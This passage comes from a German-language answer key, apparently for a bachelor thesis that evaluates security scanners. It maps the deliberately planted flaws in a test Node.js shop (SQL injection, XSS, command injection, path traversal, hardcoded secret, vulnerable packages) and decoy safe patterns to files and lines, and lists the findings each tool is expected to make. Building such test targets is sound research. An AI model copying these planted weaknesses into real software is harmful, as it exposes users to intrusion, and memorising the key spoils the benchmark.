  router.post('/settings', requireAuth, requireAdmin, (req, res) => {
    const config = JSON.parse(req.body.configJson);
    // ... update shop config
  });
  ```
- **Warum sicher:** Standard `JSON.parse()` führt keinen Code aus (anders als `eval()`); nur Admin-User können diesen Endpoint erreichen; maximaler Schaden ist fehlerhafte Konfiguration, kein RCE
- **Erwartete FP-Erkennung:** Tools die `JSON.parse(req.*)` als CWE-502 flaggen (Verwechslung mit echter Deserialisierung wie `node-serialize`)

---

## Tabellarische Übersicht

| ID | Typ | CWE | OWASP 2021 | Datei | Zeile | Tool-Kategorie | Status |
|---|---|---|---|---|---|---|---|
| V01 | SQLi (klassisch) | CWE-89 | A03 | `src/routes/auth.js` | 41 | SAST+DAST | Echt |
| V02 | SQLi (verteilt) | CWE-89 | A03 | `src/routes/products.js` + `src/models/db.js` | 26 / 90–91 | SAST+DAST | Echt |
| V03 | Stored XSS | CWE-79 | A03 | `src/routes/reviews.js` + `src/views/products/detail.ejs` | 25 / 24 | SAST+DAST | Echt |
| V04 | Reflected XSS | CWE-79 | A03 | `src/routes/products.js` + `src/views/products/search.ejs` | 22 / 12 | SAST+DAST | Echt |
| V05 | Command Injection | CWE-78 | A03 | `src/routes/export.js` | 30–33 | SAST+DAST | Echt |
| V06 | Path Traversal | CWE-22 | A01 | `src/routes/profile.js` | 46–49 | SAST+DAST | Echt |
| V07 | Insecure Deserialization | CWE-502 | A08 | `src/routes/orders.js` | 70–71 | SAST | Echt |
| V08 | Hardcoded Secret | CWE-798 | A07 | `src/middleware/auth.js` | 3 | SAST | Echt |
| V09 | Broken Authentication | CWE-287 | A07 | `src/routes/auth.js` | 61–73 | DAST | Echt |
| V10 | IDOR | CWE-639 | A01 | `src/routes/orders.js` | 43–45 | DAST | Echt |
| V11 | Missing Authorization | CWE-862 | A01 | `src/routes/admin.js` | 12–15, 20–24 | DAST | Echt |
| V12 | Open Redirect | CWE-601 | A01 | `src/routes/auth.js` | 56–58 | DAST+SAST | Echt |
| V13 | CSRF | CWE-352 | A01 | `src/routes/profile.js` | 27–35 | DAST | Echt |
| V14 | Security Misconfiguration | CWE-16 | A05 | `src/app.js` | 17, 41–46 | DAST+SAST | Echt |
| V15 | Sensitive Data Exposure | CWE-200 | A02 | `src/routes/admin.js` | 13 | DAST | Echt |
| V16 | SCA: lodash@4.17.20 | CWE-1321 | A06 | `package.json` + `src/routes/profile.js:30` | — | SCA | Echt |
| V17 | SCA: jsonwebtoken@8.5.1 | CWE-327 | A06 | `package.json` + `src/middleware/auth.js:18` | — | SCA | Echt |
| V18 | SCA: express@4.16.0 | CWE-400/1321 | A06 | `package.json` | — | SCA | Echt |
| V19 | SCA: marked@0.3.6 | CWE-400 | A06 | `package.json` + `src/routes/products.js:54` | — | SCA | Echt |
| V20 | SCA: axios@0.21.0 | CWE-918 | A10 | `package.json` + `src/routes/products.js:39` | — | SCA | Echt |
| K01 | SQLi-Köder (Konstante) | — | — | `src/routes/products.js` | 9–13 | SAST | Köder |
| K02 | eval()-Köder | — | — | `src/app.js` | 17 | SAST | Köder |
| K03 | exec()-Köder | — | — | `src/routes/export.js` | 12 | SAST | Köder |
| K04 | XSS-Köder (EJS escaped) | — | — | `src/views/products/search.ejs` | 14 | SAST | Köder |
| K05 | SQLi-Köder (Prepared Stmt) | — | — | `src/routes/orders.js` | 58–60 | SAST | Köder |
| K06 | Path-Traversal-Köder (Whitelist) | — | — | `src/routes/profile.js` | 53–64 | SAST | Köder |
| K07 | Open-Redirect-Köder (Allowlist) | — | — | `src/routes/auth.js` | 75–84 | DAST+SAST | Köder |
| K08 | Secret-Köder (Test-Fixture) | — | — | `src/middleware/auth.js` | 5–7 | SAST | Köder |
| K09 | Math.random()-Köder (UI) | — | — | `src/routes/products.js` | 16 | SAST | Köder |
| K10 | JSON.parse-Köder (Admin-Auth) | — | — | `src/routes/admin.js` | 36 | SAST | Köder |

---

## Hinweise zur Tool-Coverage-Erwartung

### SAST-Erwartungen

| Tool | Erwartete TP | Bekannte Schwächen bei dieser App |
|---|---|---|
| Semgrep (Community Rules) | V01, V04, V05, V06, V08, V12 | Wird V02 (interprozedural) wahrscheinlich verpassen; FP auf K01, K02, K03 wahrscheinlich |
| CodeQL | V01, V02, V03, V05, V06, V07 | Interprozedurales Taint; weniger FPs erwartet |
| SonarQube | V01, V03, V04, V08, V14 | V02 ggf. (je nach Taint-Tiefe); Security Hotspots für V14 |

### DAST-Erwartungen

| Tool | Erwartete TP | Erwartete Grenzen |
|---|---|---|
| OWASP ZAP | V01, V04, V05, V10, V11, V12, V14, V15 | V09 (Business Logic), V13 (CSRF abhängig von Konfiguration) |
| Burp Suite | V01, V02, V04, V05, V09, V10, V12, V13 | V07 (Deserialisierung — nur mit Custom Extension) |

### SCA-Erwartungen

| Tool | Erwartete TP | Hinweise |
|---|---|---|
| npm audit | V16, V17, V18 (transitiv), V19, V20 | Transitive V18 hängt von npm-Audit-Tiefe ab |
| Snyk | V16, V17, V18, V19, V20 | Snyk mit Reachability: V19 (marked wird verwendet) höhere Priorität |
| OWASP Dependency-Check | V16, V17, V19, V20 | V18 nur wenn transitive Deps erkannt werden |

---

## Zeilennummern-Aktualisierung

> **Nach Code-Erstellung:** Die Spalte „Zeile (geplant)" wird mit den tatsächlichen Zeilennummern aus der `clean/`-Variante aktualisiert. Die Marker-Kommentare in `annotated/` ermöglichen die genaue Verortung.

---

*Erstellt für Bachelorthesis: Evaluation von SAST/DAST/SCA Security-Scanning-Tools*  
*App-Version: 1.0.0 — Datum: 2026-05-12*
